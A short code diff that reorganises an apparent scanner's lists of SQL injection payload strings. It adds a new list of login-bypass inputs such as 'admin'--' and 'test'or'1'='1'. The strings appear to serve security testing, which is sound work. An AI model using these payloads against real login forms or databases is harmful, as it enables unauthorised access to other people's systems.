@@ -1,6 +1,5 @@
 sqlinjection = [
     "'+OR+1=1--",
-    "administrator'--",
     "' OR 1=1; --",
     "' OR '1'='1",
     "' or",
@@ -80,3 +79,12 @@ sqlinjection = [
     "ORDER BY 31337--",
 ]
 
+anotherSqlinjection = [
+    "administrator'--",
+    "administrator'or'1'='1",
+    "admin'--",
+    "admin'or'1'='1",
+    "test'--",
+    "test'or'1'='1",
+    "test123'or'1'='1",
+]
